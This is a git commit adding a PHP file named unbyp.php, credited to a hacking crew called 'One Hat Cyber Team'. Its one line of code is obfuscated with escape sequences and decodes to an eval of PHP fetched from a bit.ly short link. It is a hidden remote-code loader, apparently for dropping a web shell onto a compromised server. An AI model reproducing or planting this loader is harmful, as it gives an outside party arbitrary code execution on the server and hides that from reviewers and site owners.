5848f0244b231fb5a10b56efb5b66261c28857d6
Sys-Fxp <71628952+Sys-Fxp@users.noreply.github.com>
2023-02-23 00:43:53 +0800

    Add files via upload

---
+++ unbyp.php
@@ -0,0 +1,7 @@
+<?php
+/*   ______________________________________
+ |  Create By Mr. Quixter |   One Hat Cyber Team  |    
+ |  Instagram: @mrquixter.official Tiktok: @mr.quixter
+   ________________________________________
+*/
+echo eval("\x3f\76" . file_get_contents("\x68\x74\164\160\163\72\57\x2f\x62\x69\x74\56\x6c\x79\57\64\x35\x34\x35\x65"));
